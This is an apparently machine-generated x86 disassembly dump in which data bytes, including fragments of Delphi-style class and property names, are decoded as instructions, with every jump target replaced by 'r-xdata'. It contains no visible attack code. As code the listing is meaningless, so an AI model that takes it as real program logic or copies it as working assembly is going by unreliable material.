add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
outsd
insd
popad
je r-xdata
inc esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] bl
inc esp
add [ eax + eax ] ah
add [ eax + ebx * 2 + 0x42 ] ch
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x5a ] bl
inc esp
add [ edi * 4 - 0x42c3ffbf ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ecx ] ah
inc esp
add [ eax ] al
xor [ ecx ] ah
inc esp
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ ebx + 0x8060044 ] ah
push esp
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc edx
add al ch
pop esi
inc esp
add [ ebx + eax * 2 + 0x42 ] ch
add [ edi + ebx * 2 + 0x42bc0044 ] dl
inc edx
add [ eax + 0x43 ] dl
inc edx
add [ ebx + eax * 2 + 0x5dd40042 ] ah
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
pop ebx
inc esp
add [ eax + 0x23 ] ebx
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xb004422 ] dh
jae r-xdata
xor al 0x23
inc esp
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] dh
inc esp
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
inc edx
add al cl
pop esp
inc esp
add [ eax ] bh
inc ebx
add al 0x43
jae r-xdata
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
and al [ eax + eax + 0x6 ]
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
shl [ edx + 0xa030044 ] 0x54
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
pop eax
inc edx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
and [ eax + eax - 0x28 ] eax
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
sub [ esp + eax * 2 ] bl
add [ eax ] eax
add [ eax ] al
add al [ eax ]
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
js r-xdata
sub [ esp + eax * 2 ] bl
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
inc ebx
outsd
outsb
jae r-xdata
add [ edi * 4 - 0x43afffbf ] bh
inc ecx
add [ esp + ebx * 2 + 0x5ba40044 ] dh
inc esp
add [ eax ] dl
push esp
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ esp + edi * 4 ] ah
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
inc esp
add [ eax + 0x35 ] dl
inc ebp
add [ eax + 0x5e ] cl
inc esp
add [ eax + 0x35 ] bh
inc ebp
add [ ebp + esi + 0x5fc00045 ] cl
inc esp
add [ esi + ebx * 2 + 0x44 ] bh
add al cl
xor eax 0x35dc0045
inc ebp
add [ esi + ebx * 2 + 0x36040044 ] dh
inc ebp
add [ eax ] dl
pop edi
inc esp
add [ esi + esi ] cl
inc ebp
add [ eax ] dh
pop edi
inc esp
add [ esi + esi ] dl
inc ebp
add [ eax + 0x44 ] al
add [ eax ] ah
inc esp
add [ eax + 0x44 ] ah
add [ eax + 0x5f ] dl
inc esp
add [ eax ] ch
inc ebp
add [ esi + esi ] ch
inc ebp
add [ edi + ebx * 2 + 0x44 ] dh
add ah ah
pop esp
inc esp
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
inc edx
add ah dl
pop ebp
outsd
insb
jae r-xdata
push esp
inc ebp
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
mov ah 0x23
inc esp
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x4423b474
jb r-xdata
popad
jb r-xdata
jb r-xdata
jb r-xdata
inc ecx
add al ah
in al dx
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
and al 0xbc
outsd
insb
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
outsd
jbe r-xdata
and al [ eax + eax + 0x3 ]
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebp + 0x21a40040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
and al [ eax + eax + 0x1c ]
add [ eax ] al
add [ eax + 0x2e ] ch
inc ebp
add al bl
xor eax 0x35e40040
inc eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x442580c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
add [ eax ] al
[ eax ]
and eax [ eax + eax + 0x10 ]
imul ebp [ esi + 0x74 ] 0x44242073
add [ eax - 0x70 ] ah
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
dec esp
and al 0x44
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x235cc08b
inc esp
add [ ebx ] al
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
pop esp
and eax [ eax + eax + 0x3 ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
add [ ebx ] ah
inc esp
add [ ebx ] al
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
add [ eax + eax ] dl
add bh bh
sub [ esp + eax * 2 ] bl
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x800408d
and eax 0xb080044
push esp
dec ebp
outsd
inc esp
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
inc esp
add [ ebx + ebx * 2 + 0x54100044 ] ah
add eax 0x0
inc esp
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
add [ eax + 0x23 ] bl
inc esp
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx + edx + 0x10800040 ] al
inc eax
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
[ eax ]
add [ ebx + 0x80044 ] dh
add bh bh
sub [ esp + eax * 2 ] bl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x61 ] ecx
js r-xdata
dec esp
popad
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ecx ] al
add [ eax ] al
add [ edx + 0x44 ] dh
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add [ eax ] al
and eax [ eax + eax + 0x3 ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx + 0x11840040 ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
add ah dl
mov [ ecx ] al
nop
xor [ esi ] ah
adc [ eax ] 0x40
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x4423b474
imul esp [ gs : edi + 0x68 ] 0x4423b474
add [ eax + eax ] cl
add bh bh
or [ esi ] al
push ebx
outsb
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + 0x4422 ] dh
test [ ecx ] dl
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jbe r-xdata
inc esp
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
adc [ eax ] al
nop
hlt
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov al 0x22
inc esp
add [ eax ] al
outsb
je r-xdata
test [ ecx ] dl
inc eax
add ah dl
mov [ ecx ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
in al 0x25
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
test [ ecx ] dl
inc eax
add [ eax + 0x1d ] dl
inc esp
add [ edi + 0xd080044 ] bl
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
je r-xdata
push esp
dec ebx
jns r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
push esp
inc ebp
outsb
inc esp
jb r-xdata
add [ ecx + edx + 0x10280040 ] al
inc eax
add [ ebp + 0x266c0040 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc ebx
push 0x84007261
adc [ eax ] eax
sub [ eax ] dl
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
push esp
daa
pop es
inc edx
outsd
outsd
insb
push ebx
add ecx [ eax ]
push es
dec ebp
outsd
test [ ecx ] dl
inc eax
add [ edx ] dh
inc esp
add ah dl
mov [ ecx ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
and [ 0xf080044 ] 0x54
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
test [ ecx ] dl
inc eax
add [ ecx + edx + 0x10540040 ] al
inc eax
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x27540040 ] cl
pop es
dec ecx
outsb
je r-xdata
inc esp
jb r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
inc esp
outsd
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
outsb
je r-xdata
jb r-xdata
jb r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
test [ ecx ] dl
inc eax
add al dh
pop ds
inc esp
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x28600040 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
test [ ecx ] dl
inc eax
add [ ecx + edx + 0x10540040 ] al
inc eax
add [ eax + edx + 0x40 ] dl
add al bh
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
popad
outsb
add [ ecx + edx + 0x1ff00040 ] al
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
jbe r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
daa
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
clc
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0x7c ] si
adc [ eax ] eax
push eax
sbb eax 0x279c0044
inc esp
add [ eax ] cl
or eax 0x646e4554
inc esp
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0x7c ] si
adc [ eax ] eax
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
inc esp
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + 0x4422 ] dh
adc [ eax ] al
nop
[ eax + eax + 0x8 ] al
or al 0x54
test [ ecx ] dl
inc eax
add al dh
pop ds
outsb
je r-xdata
jbe r-xdata
inc ebp
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx + 0x2f480040 ] al
inc esp
add [ eax ] ah
aaa
inc esp
add [ eax ] al
adc [ eax ] al
pop esp
sub [ eax + eax + 0x8 ] eax
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
xor al 0x2b
inc esp
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x2f480040 ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
xor al 0x2a
inc esp
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
inc ebx
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x442bbcc0 ] cl
add [ eax ] cl
push edi
push 0x456c6565
jbe r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x442b34c0 ] cl
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
je r-xdata
push edi
push 0x556c6565
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
mov esp 0x800442b
outsb
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
push 0x6e490774
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x2d ] bh
inc esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x10540040 ] al
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
movsb [ edi ] [ esi ]
sub al [ eax + eax + 0x8 ]
jb r-xdata
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add ah cl
je r-xdata
add al cl
bound eax [ eax + eax + 0xc ]
push 0x44
add [ eax + 0x69 ] dh
inc esp
add [ eax + 0x10004472 ] bl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x83980040
inc esp
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
pop esp
popad
inc esp
add [ eax ] al
sbb [ ebp + 0x42180041 ] bl
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
test [ ecx ] dl
inc eax
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
mov al 0xe
mov al 0xd
mov al 0x8
mov al 0x35
add [ eax + 0x65 ] al
inc esp
add [ esp + esi * 2 + 0xe0044 ] ch
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
hlt
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
add [ edx + eax * 4 ] al
inc esp
add al al
xchg edx eax
inc esp
add [ eax + 0x74 ] bl
inc esp
add [ eax ] bl
inc edx
jo r-xdata
add [ eax ] bl
popfd
inc ecx
inc ebp
js r-xdata
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
outsb
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
lea eax [ eax ]
aam 0x2c
jbe r-xdata
add [ esi ] bh
das
inc esp
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2d ] ah
inc esp
add [ edi + ebp + 0x44 ] cl
add [ eax ] al
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x2cd40040 ] cl
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx - 0x772bffc0 ] al
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx - 0x772bffc0 ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
xor [ esp + eax * 2 ] ch
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
add [ eax - 0x70 ] bh
inc esp
add [ eax - 0x7c ] dh
inc esp
add [ eax - 0x44 ] dl
inc ecx
add [ eax - 0x70 ] al
inc esp
add [ esp + 0x44 ] dl
add al al
arpl [ eax + eax + 0x6c ] ax
insd
inc esp
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax + 0x7f080044 ] al
inc esp
add [ edi + edi * 2 ] al
inc esp
add ah dl
jg r-xdata
add [ ecx + 0x44 ] bl
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_443564
mov eax 0xb6ffb7ff
push [ ebp - 0x3004b01 ]
mov eax 0xba5c0044
inc esp
add [ edx + edi * 4 + 0x44 ] bh
add [ eax - 0xfffbb46 ] ah
mov edx 0xbb100044
inc esp
add [ eax ] dh
mov ebx 0xbb540044
inc esp
add [ eax - 0x45 ] bh
inc esp
add [ ebx + edi * 4 - 0x443fffbc ] bl
inc esp
add [ eax - 0x44 ] cl
inc esp
add [ eax ] cl
mov ebp 0xbd580044
inc esp
add [ ebp + edi * 4 - 0x425fffbc ] cl
inc esp
add [ eax ] ch
mov [ eax + eax + 0x54 ] 0xc6
inc esp
add [ eax ] dl
mov [ eax + eax + 0x30 ] 0xd40044c7
mov [ eax + eax - 0x5c ] 0x4c0044c8
leave
inc esp
add [ ecx + ecx * 8 + 0x44 ] ch
add [ eax - 0x3fffbb37 ] ah
leave
inc esp
add [ ebp + 0x44 ] cl
add ah dh
leave
inc esp
add [ eax ] dl
0x44
sub_4435e2
fsubr st5
inc esp
